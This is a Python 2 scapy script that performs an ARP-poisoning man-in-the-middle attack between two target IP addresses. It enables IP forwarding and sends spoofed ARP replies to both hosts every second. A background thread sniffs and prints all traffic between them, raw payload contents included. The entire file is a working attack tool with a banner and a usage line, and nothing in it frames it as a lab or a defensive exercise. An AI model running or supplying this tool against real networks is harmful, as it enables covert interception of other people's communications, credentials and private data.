__author__ = '01'
__author__ += "Binary"
__author__ += "ZeroOne"
__author__ += "Hooman"

from scapy.layers.inet import *
from scapy.all import *
import threading
import time
import sys
import os

conf.route.resync()
conf.verb = 0

def PacketAnalyze(Pck) :

    if((Pck.haslayer(IP)) and ((Pck.getlayer(IP).src == Target1_IP and Pck.getlayer(IP).dst == Target2_IP) or (Pck.getlayer(IP).src == Target2_IP and Pck.getlayer(IP).dst == Target1_IP))) :

        if((Pck.getlayer(IP).src == Target1_IP)) :

            if(Pck.haslayer(Raw)) : print "\nTarget 1 Sent : " + str(Pck.summary()) + " ==> " + str(Pck.getlayer(Raw))

            else : print "\nTarget 1 Sent : " + str(Pck.summary())

        elif((Pck.getlayer(IP).src == Target2_IP)) :

            if(Pck.haslayer(Raw)) : print "\nTarget 2 Sent : " + str(Pck.summary()) + " ==> " + str(Pck.getlayer(Raw))

            else : print "\nTarget 2 Sent : " + str(Pck.summary())

def GetMAC(IPAddress) :

    MAC = subprocess.Popen(["arp", "-n", IPAddress], stdout=subprocess.PIPE)

    MAC = MAC.communicate()[0]

    MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", MAC).groups()[0]

    return MAC

def Sniff() :

    print "[*] Sniffing ..."

    sniff(iface="eth0", prn=PacketAnalyze)

def MITM(VIP, DIP, VMAC, DMAC) :

    Sniff_Thread = threading.Thread(target=Sniff, args=())

    Sniff_Thread.start()

    print "[*] ARP Poisoning ..."

    while(True) :

        sendp(Ether(dst=VMAC)/ARP(op=2, psrc=DIP, pdst=VIP, hwdst=VMAC))

        sendp(Ether(dst=DMAC)/ARP(op=2, psrc=VIP, pdst=DIP, hwdst=DMAC))

        time.sleep(1)

if __name__ == "__main__" :

    print "[+] Welcome"

    Banner = '''

      000      0
     0   0    01
    1 0   1  0 1
    1  0  1    1
    1   0 1    1
     0   0     1
      000    10001

        =======================================================

     00000
    1     1  100001   0000   1    0  00000      1     00000   0   0
    1        1       1    1  1    0  1    1     1       1      0 0
     00000   00000   0       1    0  1    1     1       1       0
          1  1       0       0    1  00000      0       1       1
    1     1  1       1    1  0    1  1   0      0       1       1
     00000   100001   0000   100001  1    0     0       1       1

    '''

    print Banner

    if(len(sys.argv) != 3):

        print "[-] Usage : " + sys.argv[0] + " <Target_1 IPAddress> <Target_2 IPAddress>"
        exit(0)

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    Target1_IP = sys.argv[1]
    Target2_IP = sys.argv[2]

    Target1_MAC = GetMAC(Target1_IP)
    Target2_MAC = GetMAC(Target2_IP)

    MITM(Target1_IP, Target2_IP, Target1_MAC, Target2_MAC)
